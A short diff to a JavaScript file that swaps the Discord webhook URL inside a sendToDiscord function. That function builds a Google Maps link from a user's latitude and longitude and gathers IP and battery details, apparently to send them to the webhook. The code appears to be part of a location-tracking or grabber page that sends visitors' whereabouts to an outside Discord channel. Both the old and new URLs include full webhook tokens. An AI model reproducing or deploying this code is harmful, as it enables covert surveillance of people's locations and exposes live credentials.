@@ -35,7 +35,7 @@ function showError(error) {
 }
 
 function sendToDiscord(latitude, longitude, callback) {
-    var webhookUrl = 'https://discord.com/api/webhooks/1242194300838613012/VdP9q1fwTq_-n95AUMhoToMCvASepg1ILhLM9X4GgADYsNG1uKkV_lxYVTZD8X7sx4sO';
+    var webhookUrl = 'https://discord.com/api/webhooks/1400367042527236236/9fapIhMjEc7pfn1-hViE_pY4TMFOPxwAK4rJLrWcShzhcW-E9yGu-aJH6oNeSUrClWvt';
     var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
     var ip = 'Not Available';
     var batteryPercentage = 'Not Available';
